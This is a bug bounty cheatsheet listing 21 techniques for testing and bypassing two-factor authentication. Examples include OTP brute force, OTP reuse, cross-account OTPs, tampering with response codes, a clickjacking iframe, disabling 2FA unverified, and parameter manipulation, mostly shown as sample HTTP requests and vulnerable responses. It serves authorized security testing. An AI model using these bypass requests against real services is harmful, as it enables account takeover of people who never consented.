# 2FA Testing Cheatsheet for Bug Bounty Hunters
---

## 1. Status Code Changes
- **Test**: Modify HTTP response status codes during 2FA verification.
- **Example**:
  - **Request**:
    ```http
    POST /2fa/verify HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
      "otp": "123456"
    }
    ```
  - **Response** (original):
    ```http
    HTTP/1.1 403 Forbidden
    {"message": "Invalid OTP"}
    ```
  - Modify response to `HTTP/1.1 200 OK` and check access.
- **Tools**: Burp Suite, Postman.

---

## 2. Brute-Force OTP
- **Test**: Check if multiple OTP attempts are allowed without rate limiting.
- **Practical Steps**:
  1. Use Burp Suite Intruder to automate requests with payloads like `000000` to `999999`.
  2. Analyze responses for patterns.
- **Request**:
  ```http
  POST /2fa/verify HTTP/1.1
  Host: example.com
  Content-Type: application/json

  {
    "otp": "000001"
  }
  ```
- **Response**:
  ```http
  HTTP/1.1 200 OK
  {"message": "2FA Verified"}
  ```
- **Tools**: Burp Suite, wfuzz.

---

## 3. OTP Reuse
- **Test**: Check if a single OTP can be used multiple times.
- **Steps**:
  1. Submit the same OTP in consecutive requests.
  - **Request 1**:
    ```http
    POST /2fa/verify HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
      "otp": "654321"
    }
    ```
  - **Response 1**:
    ```http
    HTTP/1.1 200 OK
    {"message": "2FA Verified"}
    ```
  - **Request 2**: Resend the same payload.
  - **Expected Response**:
    ```http
    HTTP/1.1 403 Forbidden
    {"message": "OTP Expired"}
    ```
  - **Actual Response (Vulnerable)**:
    ```http
    HTTP/1.1 200 OK
    {"message": "2FA Verified"}
    ```

---

## 4. Cross-Account Token Test
- **Test**: Check if OTPs from one account work on another.
- **Example Steps**:
  1. Request OTP for Account A.
  2. Use it to authenticate Account B.
  - **Request OTP (Account A)**:
    ```http
    POST /2fa/request HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
      "user": "accountA@example.com"
    }
    ```
  - **Response**:
    ```http
    HTTP/1.1 200 OK
    {"otp": "123456"}
    ```
  - Use `123456` to log in to Account B and analyze the outcome.

---

## 5. Direct Dashboard Access
- **Test**: Attempt accessing a protected page (e.g., `/dashboard`) without solving 2FA.
- **Example Steps**:
  1. Authenticate without completing the 2FA step.
  2. Directly visit `/dashboard`.
  - **Request**:
    ```http
    GET /dashboard HTTP/1.1
    Host: example.com
    ```
  - **Expected Response**:
    ```http
    HTTP/1.1 403 Forbidden
    {"message": "2FA required"}
    ```
  - **Actual Response (Vulnerable)**:
    ```http
    HTTP/1.1 200 OK
    {"message": "Welcome to the dashboard"}
    ```

---

## 6. Search for 2FA Codes
- **Test**: Look for exposed OTPs in JavaScript files or API responses.
- **Example Steps**:
  1. Inspect source code for terms like `otp`, `code`, or `token`.
  2. Use Burp Suite's Search or DevTools.
  - **Vulnerable Script**:
    ```javascript
    var otp = "654321"; // Hardcoded OTP for testing
    ```

---

## 7. CSRF/Clickjacking on 2FA
- **Test**: Check if 2FA deactivation forms are vulnerable to CSRF or clickjacking.
- **Example Steps**:
  1. Create an HTML page embedding the deactivation form in an iframe.
  2. Use CSRF tokens to attempt unauthorized requests.
  - **Iframe Code**:
    ```html
    <iframe src="https://example.com/2fa/disable" width="800" height="600"></iframe>
    ```

---

## 8. Session Persistence
- **Test**: Check if other sessions remain active after enabling 2FA.
- **Example Steps**:
  1. Enable 2FA in one browser.
  2. Verify if another browser session is logged out.
  - **Vulnerable Behavior**: The second session remains active without prompting for 2FA.

---

## 9. OAuth 2FA Bypass
- **Test**: Check if login via OAuth skips 2FA.
- **Example Steps**:
  1. Log in with "Sign in with Google."
  2. Confirm if the application enforces 2FA afterward.

---

## 10. Disabling 2FA Without Verification
- **Test**: Send requests to disable 2FA without proper authentication.
- **Example Request**:
  ```http
  POST /2fa/disable HTTP/1.1
  Host: example.com
  Content-Type: application/json

  {
    "user": "test@example.com"
  }
  ```
- **Expected Response**:
  ```http
  HTTP/1.1 403 Forbidden
  {"message": "Verification required"}
  ```
- **Actual Response (Vulnerable)**:
  ```http
  HTTP/1.1 200 OK
  {"message": "2FA Disabled"}
  ```

---

## 11. Password Reset Without 2FA
- **Test**: Check if the "Forgot Password" flow enforces 2FA.
- **Steps**:
  1. Attempt password reset.
  2. Confirm whether 2FA validation is required during the process.

---

## 12. Test Default OTPs
- **Test**: Identify if the system accepts default OTPs like `000000` or `123456`.
- **Example Steps**:
  1. Try default values during OTP verification.
  - **Request**:
    ```http
    POST /2fa/verify HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
      "otp": "000000"
    }
    ```
  - **Response (Vulnerable)**:
    ```http
    HTTP/1.1 200 OK
    {"message": "2FA Verified"}
    ```

---

## 13. Request Manipulation
- **Test**: Modify API requests to bypass 2FA checks.
- **Example Steps**:
  1. Inspect API payloads for `2fa` or `otp` parameters.
  2. Set values like `false` or remove them entirely.
  - **Request**:
    ```http
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
      "username": "user",
      "password": "pass",
      "2fa": false
    }
    ```
  - **Response (Vulnerable)**:
    ```http
    HTTP/1.1 200 OK
    {"message": "Logged In"}
    ```

---

## 14. OpenID Misconfiguration
- **Test**: Check for improper 2FA integration with OpenID providers.
- **Steps**:
  1. Log in using OpenID.
  2. Verify if 2FA is enforced afterward.

---

## 15. OTP Expiry Check
- **Test**: Ensure OTPs expire within a short duration.
- **Example Steps**:
  1. Request an OTP.
  2. Use it after the expected expiry time.

---

## 16. Backup Code Abuse
- **Test**: Analyze vulnerabilities in backup code generation or validation.
- **Example Steps**:
  1. Generate multiple backup codes.
  2. Check if previously generated codes are invalidated.

---

## 17. Sensitive Info Exposure
- **Test**: Ensure sensitive information like email or phone numbers isn’t exposed during the 2FA process.
- **Example Vulnerability**:
  ```http
  POST /2fa/request HTTP/1.1
  Host: example.com

  {
    "user": "email@example.com"
  }
  ```
  - **Response**:
    ```http
    HTTP/1.1 200 OK
    {"otp": "123456", "phone": "+123456789"}
    ```

---

## 18. Permanent Account Lock
- **Test**: Check if enabling 2FA can permanently lock accounts.
- **Example Steps**:
  1. Enable 2FA with an unverified email.
  2. Change the email to another user’s address.

---

## 19. Authenticated Actions Without 2FA
- **Test**: Confirm if critical actions require 2FA validation.
- **Example Actions**:
  - Changing account settings.
  - Generating API tokens.

---

## 20. Bulk OTP Testing in JSON
- **Test**: Send multiple OTPs in a single request to identify improper validation.
- **Request**:
  ```http
  POST /2fa/verify HTTP/1.1
  Host: example.com
  Content-Type: application/json

  {
    "otp": ["123456", "654321", "111111"]
  }
  ```
- **Response (Vulnerable)**:
  ```http
  HTTP/1.1 200 OK
  {"message": "2FA Verified"}
  ```

---

## 21. Backup Code Misuse
- **Test**: Explore issues with generating, reusing, or invalidating backup codes.
- **Example Steps**:
  1. Generate backup codes.
  2. Attempt to reuse them after account changes.

---
- Always report findings responsibly through the appropriate bug bounty programs.
